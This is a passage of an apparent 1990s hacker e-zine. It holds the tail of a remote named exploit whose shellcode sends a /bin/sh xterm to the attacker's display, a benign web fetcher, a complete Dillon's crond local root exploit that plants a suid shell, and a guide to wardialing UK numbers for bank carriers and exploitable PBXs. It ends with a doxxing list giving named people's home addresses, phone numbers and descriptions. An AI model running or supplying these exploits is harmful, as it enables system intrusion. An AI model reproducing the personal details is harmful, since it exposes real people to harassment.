  dlen = (optimized?OPT_RET_FROM_1NOP:RET_FROM_1NOP)+4;
  PUTSHORT(dlen,ptr);
  len += PRE_OF_DATALEN;

  memset(ptr,'X',(sizeof(buff)-(ptr-buff)));

  if(t.systype==0)
    {
#ifdef REMOTE
      char c1[] =
	"\xeb\x2f\x5f\xeb\x4a\x5e\x89\xfb\x89\x3e\x89\xf2\xb0\xfe\xae\x74"
	"\x14\x46\x46\x46\x46\x4f\x31\xc9\x49\xb0\xff\xf2\xae\x30\xc0\x4f"
	"\xaa\x89\x3e\xeb\xe7\x31\xc0\x89\x06\x89\xd1\x31\xd2\xb0\x0b\xcd"
	"\x80\xe8\xcc\xff\xff\xff";
      char c2[] =
	"/usr/bin/X11/xterm\xff-display\xff";
      char c3[32];
      char c4[] =
	"\xfe\xe8\xb1\xff\xff\xff";

      snprintf(c3,sizeof(c3),"%s:0\xff-e\xff/bin/sh\xff",inet_ntoa(us));

      c1[4] = (unsigned char)0x32+strlen(c2)+strlen(c3);
      c4[2] = (unsigned char)0xc9-strlen(c2)-strlen(c3);

      i = EVILSPACE-strlen(c1)-strlen(c2)-strlen(c3)-strlen(c4);

      memset(ptr,0x90,i);
      memcpy((ptr+i),c1,strlen(c1));
      memcpy((ptr+i+strlen(c1)),c2,strlen(c2));
      memcpy((ptr+i+strlen(c1)+strlen(c2)),c3,strlen(c3));
      memcpy((ptr+i+strlen(c1)+strlen(c2)+strlen(c3)),c4,strlen(c4));
#else
      char c0de[] =
        "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
        "\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
        "\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/tmp/hi";
      int i = EVILSPACE-strlen(c0de);

      memset(ptr,0x90,i);
      memcpy((ptr+i),c0de,strlen(c0de));
#endif
    }
  else
    return(0);

  if(!optimized)
    {
      memcpy((ptr+(dlen-16)),&al,sizeof(al));
      memcpy((ptr+(dlen-12)),&dl,sizeof(dl));
    }

  i = (optimized?t.opt_addr:t.addr)+offset;
  memcpy((ptr+(dlen-4)),&i,sizeof(i));
  len += dlen;

  return(send_packet(fd,buff,len));
}

int main(int argc, char *argv[])
{
  unsigned long offset=DEFAULT_ANBUF_OFFSET;
  int target_index=DEFAULT_TARGET, optimized=DEFAULT_OPTIMIZED, sock, i;
  struct sockaddr_in sa;
  struct in_addr xs;

  for(i=0;target[i].desc[0];i++);

  if(argc<3)
    {
      fprintf(stderr,"\ntarget types:\n");
      fprintf(stderr," %-2s : %-12s - %-12s - %s\n","tt","anbuf","opt anbuf",
	      "description");
      for(target_index=0;target_index<i;target_index++)
	fprintf(stderr," %-2d : 0x%-10x - 0x%-10x - %s\n",target_index,
		(unsigned int)target[target_index].addr,
		(unsigned int)target[target_index].opt_addr,
		target[target_index].desc);
      fprintf(stderr,
	      "\nerror: usage: %s <target> <X server> [tt] [opt] [offset]\n",
	      argv[0]);
      exit(-1);
    }

  if((argc>3)&&((target_index=atoi(argv[3]))>=i))
    {
      fprintf(stderr,"error: invalid target type %d\n",target_index);
      exit(-1);
    }

  if((target[target_index].addr==0)&&(target[target_index].opt_addr==0))
    {
      fprintf(stderr,"error: internal error\n");
      exit(-1);
    }

  if(argc>4)
    {
      optimized = atoi(argv[4]);
      if((optimized!=0)&&(optimized!=1))
	{
	  fprintf(stderr,"error: invalid optimization setting %d\n",optimized);
	  exit(-1);
	}
    }

  if((optimized==0)&&(target[target_index].addr==0))
    optimized = 1;

  if((optimized==1)&&(target[target_index].opt_addr==0))
    optimized = 0;

  if(argc>5)
    offset = atoi(argv[5]);

  if(!(xs.s_addr=resolve(argv[2])))
    {
      fprintf(stderr,"error: can not resolve: %s\n",argv[2]);
      exit(-1);
    }

  if(!(sa.sin_addr.s_addr=resolve(argv[1])))
    {
      fprintf(stderr,"error: can not resolve: %s\n",argv[1]);
      exit(-1);
    }

  sa.sin_family = AF_INET;
  sa.sin_port = htons(53);

  if((sock=socket(sa.sin_family,SOCK_STREAM,IPPROTO_TCP))==(-1))
    {
      perror("error: socket");
      exit(-1);
    }

  if(connect(sock,(struct sockaddr *)&sa,sizeof(sa))==(-1))
    {
      perror("error: connect");
      exit(-1);
    }

  printf("target             : %s\n",inet_ntoa(sa.sin_addr));
  printf("target type        : %s\n",target[target_index].desc);
  printf("optimized named    : %s\n",(optimized?"YES":"NO"));
  printf("anbuff addr        : 0x%x\n",(unsigned int)
	 (optimized?target[target_index].opt_addr:target[target_index].addr));
  printf("anbuff addr offset : %lu\n",offset);
  printf("xterm display dest : %s:0\n",inet_ntoa(xs));
  printf("exploiting . . .\n");

  switch(attack(sock,xs,target[target_index],offset,optimized))
    {
    case -1:
      perror("error: attack");
      return(-1);
      break;

    case 0:
      fprintf(stderr,"error: internal error\n");
      return(-1);
      break;
    }

  if(close(sock)!=0)
    {
      perror("error: close");
      return(-1);
    }

  exit(0);
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. flea.c : SrfRoG
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/*
 * flea.c : fetch stuff from the Web without launching a browser.
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 *
 */

/*
 * TODO:
 *
 *  1) Use threads for multiple gets.
 *  2) More file options.
 *  3) Better output display.
 *  4) Configuration file.
 *  5) Host cache'ing.
 *  6) HTTP/1.1 Message parsing / compliance.
 *  7) MIME types handling.
 *
 * Email comments / suggestions to srfrog@nema.com
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <netdb.h>
#include <string.h>
#include <netinet/in.h>
#include <sys/time.h>
#include <sys/types.h>

#ifndef TRUE
#define TRUE     1
#define FALSE    0
#endif

#define	m_isalpha(x) (((x) >= 'a' && (x) <= 'z') || ((x) >= 'A' && (x) <= 'Z'))
#define	m_isdigit(x) ((x) >= '0' && (x) <= '9')
#define	m_isspace(x) ((x) == ' ' || (x) == '\f' || (x) == '\n' || (x) == '\r' || (x) == '\t' || (x) == '\v')

#define MAXLEN 512
#define WIDTH 79
#define VERSION "0.9"

unsigned int serv_port(char);

/* Some variables used */
static  int     nofetchfile = FALSE;
static	char	*pn = (char *)0;

typedef	struct	url_entry
{
	char	*hostname;
	unsigned int port;
	char	*path;
	char	*file;
} URL;

static  void status(char *fmt, ...)
{
	va_list msg;
	char buf[MAXLEN], *p = buf, c;
	int len;
static	int old_len = 0;

	va_start(msg, fmt);
	vsprintf(buf, fmt, msg);
	va_end(msg);

	len = strlen(buf) - 1;
	c = buf[len];
	write(1, p, len);

	if (old_len > len) {
		int i, j;
		char k = ' ';

		for (i=0, j=(old_len - len); j > i; ++i)
			write(1, &k, 1);
		write(1, &c, 1);
		return;
	}
	old_len = len;
	write(1, &c, 1);
}

static	int strcount(s, c)
	char *s, c;
{
	int     index=0, count=0;

	while (s[index] != '\0')
	{
		if (s[index] == c)
			count++;
		index++;
	}
	return(count);
}

static	URL strip_url(url)
	char *url;
{
	int	i, idx=0, skip=0;
	char	tmp[MAXLEN*2], *p = tmp;
	URL	u;

	if (0 == strncmp(url,"http://",7))
		idx = 7;
	for (i=0; (url[idx]!=':' && url[idx]!='/' && url[idx]!='\0'); i++,idx++)
		tmp[i] = url[idx];
	if (i == 0)
		return (u);
	tmp[i] = 0;
	u.hostname = strdup(p);

	if (url[idx] == ':') {
		++idx;
		for (i=0; m_isdigit(url[idx]); i++,idx++)
			tmp[i] = url[idx];
		tmp[i] = 0;
		u.port = (unsigned int) atoi(p);
	} else
		u.port = 80;

	skip = strcount(&url[idx], '/');
	for (i=0; skip > 0; i++,idx++)
	{
		tmp[i] = url[idx];
		if (url[idx]=='/')
			skip--;
	}
	tmp[i] = 0;
	u.path = strdup(p);

	for (i=0; url[idx]!='\0'; i++,idx++)
		tmp[i] = url[idx];
	tmp[i]=0;
	u.file = strdup(p);

	if (i == 0) {
		nofetchfile = TRUE;
		strcpy(p,"flea.dump");
		u.file = strdup(p);
	}
	return (u);
}

static	int connect_url(u)
	URL	u;
{
	struct hostent *host;
	struct sockaddr_in sin;
	int s = -1;

	if ((host = gethostbyname(u.hostname)) == NULL) {
		perror(pn);
		return(-1);
	}
	if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		perror(pn);
		return(-2);
	}
	sin.sin_family = AF_INET;
	sin.sin_port = htons(u.port);
	bcopy(host->h_addr, &sin.sin_addr, host->h_length);

	printf("Connecting to remote host %s:%u\n", u.hostname, u.port);
	if (connect(s, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
		perror(pn);
		close(s);
		return(-3);
	}
	return (s);
}

static	void process_file(fdw, fdr, u)
	int fdw, fdr;
	URL *u;
{
	time_t start = 0L, end = 0L;
	int n, m, bytes=0;
	float x=0.0;
	char buffer[MAXLEN+1], *p = buffer;

	time(&start);
	while (1) {
		n = read(fdr, p, MAXLEN);
		switch (n) {
		case -1:
			status("%s: Read error: %s\n", u->file, strerror(errno));
			break;
		case 0:
			time(&end);
			n = (int)(end - start) + 1;
			x = (float)bytes / (float)n;
			x /= 1024.0;
			status("%s: Received %d bytes in %d sec%s (%.3f kb/s)\n",
				u->file, bytes, n, (n == 1) ? "" : "s", x);
			break;
		default:
			m = write(fdw, p, n);
			if (m > 0) {
				bytes += m;
				status("%s: Writing: %d bytes\r", u->file, bytes);
				continue;
			}
			status("%s: Write error: %s\n", u->file, strerror(errno));
			break;
		}
		break;
	}
	close(fdw);
	close(fdr);
}

static	void launch_fetcher(url)
	char *url;
{
	int	sock = -1, i, j,
		outfd = -1;
	URL	u;
	char	tmp[MAXLEN*2];

	/* sanity */
	if (!url)
		return;

	u = strip_url(url);
	if (!u.hostname) {
		perror(pn);
		return;
	}
	if ((sock = connect_url(u)) < 0)
		return;
	if ((outfd = open(u.file, O_WRONLY | O_CREAT | O_TRUNC, 0644)) < 0) {
		perror(pn);
		close(sock);
		return;
	}
#if defined(__linux__)
	i = sprintf(tmp, "GET %s%s HTTP/1.0\r\n\r\n",
		u.path, (nofetchfile == FALSE)?u.file:"/");
#else
	sprintf(tmp, "GET %s%s HTTP/1.0\r\n\r\n",
		u.path, (nofetchfile == FALSE)?u.file:"/");
	i = strlen(tmp);
#endif
	if (send(sock, tmp, i, 0) < 0) {
		perror(pn);
		close(sock);
		close(outfd);
		return;
	}
	/* remove httpd header */
	{
		char c;

		j=0;
		while (read(sock, &c, 1)) {
			tmp[j++] = c;
			if (c != '\n')
				continue;
			if (j > 2) {
				tmp[j]=0; j=0;
				printf("%s: %s",u.file,tmp);
				fflush(stdout);
				continue;
			}
			break;
		}
	}
	status("%s: Waiting for data connection...\r", u.file);
	process_file(outfd, sock, &u);
}

int main(argc, argv)
	int argc;
	char **argv;
{

	if (argc < 2) {
		printf("\nflea Web fetcher v%s by SrfRoG (srfrog@nema.com)\n\n", VERSION);
		puts("\
Usage: flea [http://host[:port][/][filename]]\n\n\
If no file is given, the index file or file listing\n\
is dumped to 'flea.dump'.\n\n\
Examples:\n\
\tflea http://www.cgifx.com/img/cgifx.gif\n\
\tflea http://www.cgifx.com/img/\n\
\tflea http://www.cgifx.com");
		fflush(stdout);
		return 1;
        }

	pn = argv[0];

	launch_fetcher(argv[1]);

	return 0;
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  4. Dillons Linux crond exploit : BM V  
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/*   Dillon's Crond v2.2 exploit            */
/*                                          */
/*   There exists a buffer overflow         */
/*   in Slackware's /usr/sbin/crond         */
/*   in the fdprintf() function from        */
/*   subs.c [specifically vsprintf()]       */
/*   Also take note that the overflow       */
/*   was discovered by the KSRT team.       */
/*                                          */
/*   Simply compile and run this.           */
/*   and look for a suid root shell         */
/*   in /tmp (/tmp/XxX) in about one        */
/*   minute. Also please use this in        */
/*   a responsible manner.                  */
/*                                          */
/*   also try crondsploit 1000              */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <pwd.h>

#define DEFAULT_OFFSET 560
#define DEFAULT_BUFFER_SIZE 980 
#define TOTAL_BUFFER 4096

char shellcode[]=
"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07"
"\x89\x56\x0f\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12"
"\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80\xe8"
"\xd7\xff\xff\xff/tmp/xo";

long get_esp(void) {
   __asm__("movl %esp,%eax");
}

void calc_bs(int *bs_ptr)
{
        int len=0;
        struct passwd *p_name;

        /* dependant on length of username */
        p_name=getpwuid(getuid());
        len=strlen(p_name->pw_name);
        *bs_ptr = 986 - len;
        return;
}

int main(int argc, char **argv) {
        char *buff = NULL;
        unsigned long *addr_ptr = NULL;
        char *ptr = NULL;
        int i, ofs=DEFAULT_OFFSET;
        int bs=DEFAULT_BUFFER_SIZE;
        FILE *fp=NULL;

        /* probably will not need to give argument */
        if (argc==2)
                ofs=atoi(argv[1]);
        calc_bs(&bs);
        buff=malloc(TOTAL_BUFFER);
        if(!buff) {
                perror("malloc");
                exit(EXIT_FAILURE);
        }
        ptr=buff;
        memset(ptr,0x90, bs-strlen(shellcode));
        ptr += bs-strlen(shellcode);
        for (i=0; i<strlen(shellcode); i++)
                *(ptr++) = shellcode[i];
        addr_ptr = (long *)ptr;
        for (i=0; i<2; i++)
                *(addr_ptr++)=get_esp()-ofs;
        ptr=(char *)addr_ptr;
        *ptr=0;

        /* create binary in /tmp to make suid shell */
        fp=fopen("/tmp/xo.c","w+");
        if (!fp) {
                fprintf(stderr,"Can't open /tmp/xo.c for writing!");
                exit(EXIT_FAILURE);
        }
        fprintf(fp,"#include <stdio.h>\n");
        fprintf(fp,"#include <stdlib.h>\n");
        fprintf(fp,"main() {\n");
        fprintf(fp,"\tsystem(\"/bin/cp /bin/sh /tmp/XxX\");\n");
        fprintf(fp,"\tsystem(\"chown root /tmp/XxX\");\n");
        fprintf(fp,"\tsystem(\"chmod 4755 /tmp/XxX\");\n");
        fprintf(fp,"}\n");
        fclose(fp);
        /* compile our program to create suid shell */
        system("cc -o /tmp/xo /tmp/xo.c");
        unlink("/tmp/xo.c");


        /* now use crontab to plant overflow for crond */
        fp=fopen("r00t","w+");
        if (!fp) {
                perror("fopen");
                exit(EXIT_FAILURE);
        }
        fprintf(fp,"%s\n",buff);
        fclose(fp);

        /* put our r00t crontab in crontabs directory */
        system("/usr/bin/crontab r00t");
        unlink("r00t");

        /* helpful reminder */
        printf("Now wait about 1 minute and look\n");
        printf("for the suid shell -> /tmp/XxX\n");
        exit(0);
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  5. KDE klock local exploit : someone on bugtraq
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

..included in kde.gz with this crh009.zip

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ FONES / SCANNING ]=========[ .SECTION C. ]===========[ FONES / SCANNING ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. Wardialing in the UK : Jf
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Wardialing in the UK, for me, is a very interesting subject.  Although a lot of
the modern c0de kiddies consider it "old-sk00l" and see it as no use today, 
Wardialing is actually, in my opinion, one of the greatest Hacking related
things to do.  Hacking a Webpage is fun yes but an isolated carrier provides
much more entertainment and excitement, and via wardialing we aim to find
these carriers along with lots of other cool things which will provide the
phun.

All the time, I am approached and people ask me HOW TO wardial in the UK,
I always tell people its the same as in the UK, but people act so confused
about the whole idea of UK Wardialing.  Basically the little Windoze kiddies
see some old wardialer, try it out and find that the area code to enter is only
allowed to be up to 3 numbers long, therefore a US area code, with this they
panic and cry out for help. Or they download a version of ToneLoc and PANIC
because they do not understand the program, which CAN be used for UK
wardialing and its the one I always use.  This is where this help file is
intended to come in useful, it will guide you through the basics of wardialing
in the UK, and what you will find on your journey and it will also guide you
with using Toneloc succesfully to scan loads of numbers and gain interesting
results infinding carriers, VMBs, PBXs and numerous other interesting things.

##############
Where to start
##############

Wardialing is the process of scanning a large range of numbers and finding
interesting things, as I have already stated.  There are literally thousands
of Carrier Tones in England which all perform different tasks and are owned
by different companies.

For example -

        Banks                   (yes BANKS, hehe), 
        Libraries               (delete those excess fines)
        Local Government        (piss off your council)

        ..and loads more big companies and organisations.

It may sound like a little movie-style picture of hacking (WARGAMES comes to
mind) but its REAL, it does exist and people do mess with this sort of thing,
hehe. Certain Carrier tones can also be abused and be setup so that you can
connect perfectly to the Internet which will result, if the carrier is located
within a FREE CALL netw0rks, in an 0800 dialup.  

People tend to mainly wardial for carrier tones but VMBs and PBXs can be found
by Wardialing as well, so wardialing provides a great use for Phreaks who are
interestedin these things.  Although I personally haven't found an PBX while
wardialing for about 6 months but, someone, somewhere will no doubt be finding
one and abusing one as I type. VMBs are common findings while wardialing,
especially on FREE CALL netw0rks and I have great phun with these.

The 0800/0500 Service Network numbers, which are of course FREE, are the best
place to start wardialing due to the LARGE percentage of businesses who have
carriers located on them, to transfer data from area to area at low cost
(only rental of number). It is also a lot safer to wardial than normal area
codes because you will not be dialing peoples houses, so you can dial 0800/0500
numbers at night and not be waking people up (not that I care, its just that
they might report the wardialing call to BT as a nuisance call).

If you like the idea of Blueboxing then the 0800 89 **** number block will
interest you. As you may already know, this block of numbers act as the
COUNTRY DIRECT numbers, with some being boxable.  From wardialing you will be
able to note which ones are boxable if you listen into the wardialing progress,
as boxable numbers (CCITT5 Lines) will give a little series of bleeps when they
pickup, these are instantly recognisable and if you here this you will know that
it is boxable.

Well thats a basic introduction into the uses of Wardialing in the UK, so how
bout it? Are you ready to step into this world? This is the real deal and could
land you in a lot more trouble than a webpage hack, no doubt most people reading
this will have already delved into wardialing as it is nothing new but some
newbies to the subject might be a little misguided about the whole wardialing
deal...

#######
ToneLoc
#######

Yes, This is the wardialer that I recommend for wardialing in the UK, it is
however one of the mose complicated to understand if you have never used it
before, but this section will explain how to use ToneLoc to its full
capabilities and get scanning straight away.  A download URL for ToneLoc is
provided in the *URLs* section of this paper.

Right, lets get started...We will keep the example simple by using the same
variables throughout this section.  When you are actually doing your own
wardialing you will of course need to change these variables.  People who have
read the ToneLoc User Docs may find some of this familiar but some people DO
NOT realise that the examples in the user docs CAN be interpreted into UK use.

For this papers example we are going to scan the 0800 666 *** range which will
provide us with 100 results.  It is easy to make this scan A LOT bigger but
for times sake we are going to look at this example now.

Now we have discussed the variables of this example we can get down to using
ToneLoc.

First of all you need to restart your computer in DOS m0de and enter the
ToneLoc directory. The First thing you need to do is to set the CONFIGURATION
SETTINGS to what you require. So, open TLCFG.EXE and you will see 6 menus at
the top of the screen.

The *FILES* menu is used to change any log files that are used in the program.
You can edit the names of these log files from this menu but its easiest to
keep the names the same, from this menu you can easily see what the function of
each .log file is.

The *MODEM STRINGS* menu is used to setup the modem sequence for dialing etc.
Here is where you need to enter your dialing prefix (0800) so that the program
understands our range. 

The *MODEM OPTIONS* menu is for your modem settings such as Com Port, Baud Rate,
IRQ etc. I would recommend setting your baud rate at 19200 even if you have a
faster modem, the program (due to being 4 yrs old) doesn't seem to like any
baud rate above 19200.

The *SCAN OPTIONS* are the options which you may want to change which affect
what it happening during the scan. eg. Sound, Wait Delay etc. I would recommend
the Wait Delay being quite small to make the scan run faster but remember to
keep it long enough for lines to pickup and for ToneLoc to register whether
the line is a carrier, PBX, VMB, or Normal Line.

The *COLORS* menu is just for editing the colors of the program. Nothing major
to worry about.

And finally, the *QUIT* menu is where you can chose to save or abort changes
made to the configuration file.

If you have looked through all those menus you will see that there is a lot of
different things that you can change and play with and by now, you should know
which ones to change to suit your UK Wardialing needs.
 
Now that you should have all the configuration of ToneLoc setup SPECIFICALLY
for your scanning needs we can get down to some major wardialing. If it is your
first time using ToneLoc you will need to just open TONELOC.EXE and read the
stuff it brings up.

As you can probably see, there are LOTS of parameters within ToneLoc that can
be used when scanning. ToneLoc allows for a lot of user choice which is
something that attracts me to using it.  For example, you can easily program
the number range to scan and the number range to exclude from the scan by just
selecting a different parameter.

To scan a range of numbers in the 0800 prefix - eg. 0800-666-100 <-->
0800-666-200 the command at the DOS prompt would be :-

TONELOC 666-XXX /R:100-200

This would then scan all the numbers between 0800-666-100 and 0800-666-200 and
log the results into the log files specified in the *FILES* configuration menu.
This is the option I use the most and its the parameter I recommend you get to
know well.

Next, suppose you want to scan all the numbers between 0800-666-000 and
0800-666-999, but you had already scanned the 0800-666-100/200 section in your
last scan. This is where the EXCLUDE parameter comes into use.

TONELOC 666-XXX /D:100-200

This would result in you scanning all numbers 0800-666-000 <--> 0800-666-999
Excluding 0800-666-100 <--> 0800-666-200

If you look at the ToneLoc User Guide included in the tl110.zip you will see
this explained as well as lots of other ways to scan.

Another Favourite of mine is to use the following command line.

TONELOC 666-XXX

This will scan 0800-666-000 <---> 0800-666-999  and it will save the results to
the data file 666-XXX.dat.  You must always remember to have the correct
variables added into the Configuration program.

Now that you know the basic and most used parameters of ToneLoc its time to get
Wardialing.

If you watch a wardialing session you will see that it seperatly dials each
number and tells you whats happening on screen. It will tell you when it finds
anything interesting such as a *gasp* Tone, a Carrier or a Voice and it also
appends the results to the log file so you can remember the numbers of
interesting stuff and go back and play with them later.

You must remember that the fun does not end at Wardialing, a lot of people
find wardialing and scanning boring, but I find it one of the more interesting
parts of Hacking/Phreaking as you never know when your going to be lucky enough
to jump upon a neat carrier (for a bank, hehe), a PBX or a VMB, the fun starts
here. You need to follow all your wardialing findings up and learn how to use
what you have found in a way which benefits you, after all isn't that the aim?

####
URLs
####

Below are the necessary URLs to download ToneLoc and maybe find out more
information about Wardialing in general.

First of all you will NEED a copy of ToneLoc (the wardialer I am recommending)

        http://www.linenoise.org/philez/wardialers/tl110.zip


Now that you have started Wardialing in the UK, how about sharing some of your
findings or finding people who may help you on your quests and related projects.
The Linenoise WWWBoard is a place for this to come to life.

        http://www.linenoise.org/wwwboard/

###
End
###

Well, thats all the Information that you need to get you going with Wardialing
in the UK and using ToneLoc successfully, just be careful and remember that
you're responsible if you fuck up, you cannot blame me, the teacher is not to
blame. In the near future I would like to c0de a Wardialer specifically for the
UK, which would be easy to use, understand and gain successful results from.
It is a project that I always keep on the back burner but if enough people
wanted to see it, I might bring it foward, let me know...

Jf_
<JF@linenoise.org>

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ MISC ]=====================[ .SECTION D. ]=======================[ MISC ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. p0sse.rolodex (mad outdated anyway) : juurigaveitout
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Alan Wilson (aka. "w1ng")
58 Moon Drive                     215-305-8379 <pager>
Morrisville, PA  19069            215-736-1863 <voice>
Drexel University                 215-752-1324 <SCC for his 5E>
wing@dunx1.ocs.drexel.edu
 
Known Sites:  *.drexel.edu, *.rutgers.edu, *.delphi.com.
 
Short brown hair, brown eyes.  Approximately 5'10 130 pounds. 
Very scrawny appearence.  Roughly 19 to 20 years old.  Commutes
to Drexel University from his home in Morrisville.  Computer 
Science major.  Works part time doing Data-Entry.  Egomaniacle, 
novice UNIX experience, short-tempered, hostile and arrogant.
 
Logs:
[dunx1.ocs.drexel.edu]
Login name: wing                        In real life: Wong Ing
Directory: /home/dunx1/under/wing       Shell: /bin/sh
Last login Fri Feb 25 19:21 on ttyqf from gandalf.rutgers.edu
New mail received Sat Feb 26 12:00:09 1994;
  unread since Fri Feb 25 19:27:18 1994
No Plan.
 
______
 
Don Neumann (aka. "peaboy", "speedin")
7340 Hayward Drive                216-656-1912 <voice>
Chardon, Ohio                     216-650-5181 <data>
 
Known Sites:  *.DELPHI.COM, *.MsState.edu, *.wustl.edu
 
16-17 years of age.  Dropped out of his local High School his Senior
year.  Works part time as a desk clerk at a local motel.  He is not
attending a college, and presumably has no GED.  
_____
 
Steven Dake (aka. "riley" "renegade bit head" "rbh")
1731 North Fairway
Flagstaff, Arizona 86011          602-526-9184 <home>
North Arizona University (NAU.EDU)
Email unknown.
 
Known Sites: herbon.connected.com, *.NAU.EDU, *.CS.UTC.EDU,
             ballison.extern.ucsd.edu, *.caltech.edu.
 
Appearance unknown.  Approximately 20-23 years of age.   Computer
Science major, second of third year.  He lives on campus in the
dormitories.  His parents reside at the North Fairway address.
He often comes out of UTC.EDU and CONNECTED.COM.,
 
_____
 
Greg Perry (aka. "z00m" "digital hitler" "j00" "gary" "Gary Seven")
 
Known Sites: *.cftnet.com
 
_____
 
Lane Davis Jr. (aka. "merc")
Phoenix, Arizona                 602- <home> <unlisted>
 
Known Sites: NAU.EDU, indirect.com, internet.com, 
 
_____
 
(aka. "Sciz")
 
Known Sites: *.drexel.edu
 
6'10 155, very scrawny.  Short permed blonde hair, blue or green eyes.
Freshman or Sophomore at Drexel University.  Lives in a dormitory on
campus.  Good friends with Alan Wilson.  He rides an unregistered Honda
Motorcycle.
 
_____
 
Scott (aka. "X")
 
Known Sites: CAPELLA.CS.UTC.EDU, HOBBES.CS.UTC.EDU, EXPLORER.CS.UTC.EDU.
Email: X@capella.cs.utc.edu
 
He attends and apparently administers part(s) of the CS.UTC.EDU school
and domain.  He has Brown hair, small build, 5'9" tall, about 155 pounds,
brown eyes.
 
_____
 
Chris Fisher (aka. "y", "Y-W1nD0z3")
 
Known Sites: uahcs2.cs.uah.edu, grendel.cs.uah.edu, tycho.cs.uah.edu
Email: cfisher@uahcs2.cs.uah.edu
 
Very egomaniacle.  Known for harassing CERT in news groups:
 
] X-News: uqvax comp.security.unix:4675
] From: crfisher@nyx10.cs.du.edu (I am being repressed.)
] Subject:Cert; my what a witty bunch.
] Date: Mon, 11 Apr 94 19:52:33 GMT
] Message-ID:<1994Apr11.195233.17351@mnemosyne.cs.du.edu>
]
] Once again cert proves what a great bunch of guys they are. I guess they had
] never heard of gnufinger before...isn't it amazing that some people still
] respect them?
 
Logs:
